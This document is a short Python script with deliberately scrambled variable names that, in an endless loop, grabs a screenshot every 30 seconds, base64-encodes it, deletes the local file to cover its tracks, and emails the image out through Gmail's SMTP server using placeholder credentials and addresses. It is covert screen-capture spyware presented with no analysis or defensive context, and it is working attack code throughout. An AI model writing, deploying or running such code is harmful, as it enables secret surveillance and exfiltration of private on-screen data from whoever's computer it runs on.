import time
while True:
  from PIL import ImageGrab
  JFzfkhQFpUkkbnHQcCcLvUPBIfatynLl = ImageGrab.grab()
  LJSTORXvFbsNcerYFacuJFCleqERIkRa = "scr.jpg"
  JFzfkhQFpUkkbnHQcCcLvUPBIfatynLl.save(LJSTORXvFbsNcerYFacuJFCleqERIkRa)
  import base64,os
  AkkjaXanYheDFALsKzxVEAdjebyDwQtl=open('scr.jpg','rb')      
  NtYhOJMoBOZaacyoemKJdTxanVwXJlFZ=AkkjaXanYheDFALsKzxVEAdjebyDwQtl.read()
  NtYhOJMoBOZaacyoemKJdTxanVwXJlFZ=base64.b64encode(NtYhOJMoBOZaacyoemKJdTxanVwXJlFZ)
  AkkjaXanYheDFALsKzxVEAdjebyDwQtl.close()
  os.remove(LJSTORXvFbsNcerYFacuJFCleqERIkRa)
  import smtplib   
  KZxTxbYFQgXljJDeLaaRNEKZekzOUgRz = smtplib.SMTP('smtp.gmail.com', 587)   
  KZxTxbYFQgXljJDeLaaRNEKZekzOUgRz.starttls()
  KZxTxbYFQgXljJDeLaaRNEKZekzOUgRz.login("xxx@gmail.com", "password") 
  
  ufeGuycCzwzFXsKNRyrAcCwetCWjdrtc = NtYhOJMoBOZaacyoemKJdTxanVwXJlFZ
  
  KZxTxbYFQgXljJDeLaaRNEKZekzOUgRz.sendmail("senderemail@gmail.com", "receiveremail@gmail.com", ufeGuycCzwzFXsKNRyrAcCwetCWjdrtc) 
  time.sleep(30)
